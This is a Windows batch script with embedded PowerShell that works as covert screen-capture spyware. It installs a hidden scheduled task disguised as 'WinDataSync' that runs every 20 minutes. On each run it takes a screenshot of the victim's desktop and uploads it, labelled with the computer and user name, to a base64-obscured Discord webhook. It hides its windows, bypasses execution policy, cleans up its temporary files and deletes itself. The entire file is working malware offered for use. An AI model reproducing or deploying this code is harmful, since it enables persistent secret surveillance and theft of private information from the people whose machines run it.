@echo off
setlocal EnableExtensions

:: ================= CONFIG =================
:: Your Webhook (Base64 Encoded)
set "W_B64=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTQ2ODQ3OTcwNzY3NjczNS9MU0NEeUtlMHh4d1Nyb0h5OEJISS1nUXA0TmE3dlowRWJIeFk5MGhxSlZJSmxBLW1ud0JqR0U0eGJ0UkYtWG1tRjhzbA=="
set "IMG_DIR=%TEMP%"
set "FULL_PATH=%IMG_DIR%\.cache_%RANDOM%.jpg"
set "TASK_NAME=WinDataSync"
set "PS_SCRIPT=%TEMP%\.tmp_proc.ps1"
:: ==========================================

:: 1. Force Update the Task (Every 20 Mins)
:: We delete first to ensure the new 20-minute timer overwrites any old settings
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel% equ 0 schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

:: Create the task to run hidden every 20 minutes
schtasks /create /tn "%TASK_NAME%" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File \"%~f0\" bg" /sc minute /mo 20 /rl limited /f >nul 2>&1

:: 2. Extract PowerShell Logic from this file
findstr /b "###" "%~f0" | findstr /v "###findstr" > "%PS_SCRIPT%"
powershell -NoProfile -Command "(Get-Content '%PS_SCRIPT%') -replace '###', '' | Set-Content '%PS_SCRIPT%'"

:: 3. Execute the Logic (Hidden)
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS_SCRIPT%" -W64 "%W_B64%" -FilePath "%FULL_PATH%"

:: 4. Clean up the temporary PS1 and Image
if exist "%PS_SCRIPT%" del /f /q "%PS_SCRIPT%"
if exist "%FULL_PATH%" del /f /q "%FULL_PATH%"

:: 5. Self-Delete the Batch file (Only on first manual run)
:: When the task runs it with 'bg', it won't delete itself so it can run again
if "%~1" neq "bg" (
    timeout /t 1 >nul
    (goto) 2>nul & del "%~f0"
)
exit /b

###Param($W64, $FilePath)
###try {
###    # Decode Webhook
###    $W = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($W64))
###    
###    # Take Screenshot
###    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
###    $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
###    $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
###    $g = [System.Drawing.Graphics]::FromImage($b)
###    $g.CopyFromScreen(0,0,0,0,$b.Size)
###    $b.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
###    $g.Dispose(); $b.Dispose()
###
###    if (Test-Path $FilePath) {
###        # Upload to Discord via Multipart Form
###        $K = [System.Guid]::NewGuid().ToString()
###        $H = @{ 'Content-Type' = "multipart/form-data; boundary=$K" }
###        $F = [System.IO.File]::ReadAllBytes($FilePath)
###        $MS = New-Object System.IO.MemoryStream
###        $SW = New-Object System.IO.StreamWriter($MS)
###        $SW.Write("--$K`r`nContent-Disposition: form-data; name=`"payload_json`"`r`n`r`n{`"content`":`"📸 Snapshot: $env:COMPUTERNAME ($env:USERNAME)`"}`r`n--$K`r`nContent-Disposition: form-data; name=`"file`"; filename=`"log.jpg`"`r`nContent-Type: image/jpeg`r`n`r`n")
###        $SW.Flush(); $MS.Write($F, 0, $F.Length)
###        $SW.Write("`r`n--$K--`r`n"); $SW.Flush()
###        Invoke-RestMethod -Uri $W -Method Post -Headers $H -Body $MS.ToArray() | Out-Null
###    }
###} catch { }
